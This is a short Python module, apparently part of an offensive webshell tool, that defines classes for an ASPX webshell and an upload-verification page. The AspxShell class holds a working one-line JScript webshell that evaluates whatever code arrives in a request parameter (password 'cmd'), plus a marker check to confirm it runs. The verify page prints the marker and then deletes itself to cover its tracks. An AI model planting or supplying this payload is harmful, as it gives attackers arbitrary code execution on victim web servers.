#author: fyth.cnss@gmail.com

from webshell import *


class AspxShell(Webshell):
    _password = 'cmd'
    _content = '<%@ Page Language="Jscript"%>' \
               '<%eval(Request.Item["{0}"],"unsafe");%>'
    _check_statement = 'Response.Write("202cTEST4b70".Replace("TEST",' \
                       '"b962ac59075b964b07152d23"))'
    _keyword = '202cb962ac59075b964b07152d234b70'


class AspxVerify(VerifyShell):
    _content = '<%@ Page Language="Jscript" ContentType="text/html" ' \
               'validateRequest="false" aspcompat="true"%>\n' \
               '<%Response.Write("202cTEST4b70".Replace("TEST",' \
               '"b962ac59075b964b07152d23"))%>\n' \
               '<%System.IO.File.Delete(Request.PhysicalPath);%>'
    _keyword = '202cb962ac59075b964b07152d234b70'